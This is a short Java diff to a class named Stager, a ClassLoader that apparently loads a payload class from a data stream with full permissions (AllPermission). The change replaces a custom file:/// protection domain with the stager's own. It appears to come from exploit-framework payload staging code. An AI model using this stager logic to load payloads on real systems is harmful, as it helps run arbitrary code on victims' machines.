@@ -306,7 +306,8 @@ public class Stager extends ClassLoader {
                         //Get the payload
                         Permissions localPermissions = new Permissions();
                         localPermissions.add(new AllPermission());
-                        ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
+                        ProtectionDomain localProtectionDomain = Stager.class.getProtectionDomain();
+                        //ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
                         Class localClass;
 
                         int classLength = localDataInputStream.readInt();
